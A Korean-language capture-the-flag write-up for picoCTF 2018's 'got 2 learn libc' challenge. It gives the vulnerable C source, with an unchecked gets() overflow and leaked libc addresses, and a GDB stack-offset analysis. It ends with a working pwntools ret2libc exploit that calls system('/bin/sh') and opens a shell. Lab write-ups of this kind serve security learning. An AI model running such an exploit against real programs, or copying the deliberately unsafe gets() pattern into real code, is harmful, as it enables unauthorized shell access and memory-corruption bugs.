# picoCTF 2018

<h5> got 2 learn libc </h5>
<hr>

<h5> Solution </h5>

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

char useful_string[16] = "/bin/sh"; /* Maybe this can be used to spawn a shell? */


void vuln(){
  char buf[BUFSIZE];
  puts("Enter a string:");
  gets(buf);
  puts(buf);
  puts("Thanks! Exiting now...");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  puts("Here are some useful addresses:\n");

  printf("puts: %p\n", puts);
  printf("fflush %p\n", fflush);
  printf("read: %p\n", read);
  printf("write: %p\n", write);
  printf("useful_string: %p\n", useful_string);

  printf("\n");
  
  vuln();

  
  return 0;
}
```

<p> 코드를 보면 눈에 띄는 부분들인, 함수의 주소들을 출력해주는 부분이 있다. </p>
<p> 바로 떠오르는 방법인, 주어지는 함수를 릭하는 문제이다. </p>

<p> 먼저 입력 버퍼를 GDB를 통해서 메모리를 보자, </p>
<img class="border-shadow" src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fk.kakaocdn.net%2Fdn%2Fb9pvi1%2FbtqxRuQsP6f%2FTcTo8ZnBp6BHIgVOAOiex1%2Fimg.png"><br>

<p> vuln+42 ( lea eax, [ebp-0x9c] ) 라인이 입력 버퍼가 저장되는 공간이다. </p>

<p> 0x9c = 156Byte + SFP(4) + RET 순서로 스택을 정리 하자. </p>

<p> 먼저 주어지는 함수들의 주소를 받아, libc에서 오프셋을 구한 뒤, 실제 함수의 주소를 구해야 한다. </p>

<p> 바이너리에서 useful_string 이라는 변수에 "/bin/sh" 를 지정해줬기 때문에 /bin/sh 을 따로 구하지 않아도 바로 쉘을 획득할 수 있다. </p>


```py
#!/usr/bin/python

from pwn import *

p = process('./vuln')

libc = ELF('/lib/i386-linux-gnu/libc.so.6') # PicoCTF libc File /lib32/libc.so.6

libc_read = libc.symbols['read']
libc_system = libc.symbols['system']

p.recvuntil('read: ')

read_addr = int(p.recv(10),16)

p.recvuntil('useful_string: ')

binsh_addr = int(p.recv(10),16)

p.recvlines(3)

libc_base = read_addr - libc_read
system_addr = libc_base + libc_system

payload = "A"*160
payload += p32(system_addr)
payload += "A"*4
payload += p32(binsh_addr)

p.sendline(payload)

p.interactive()
```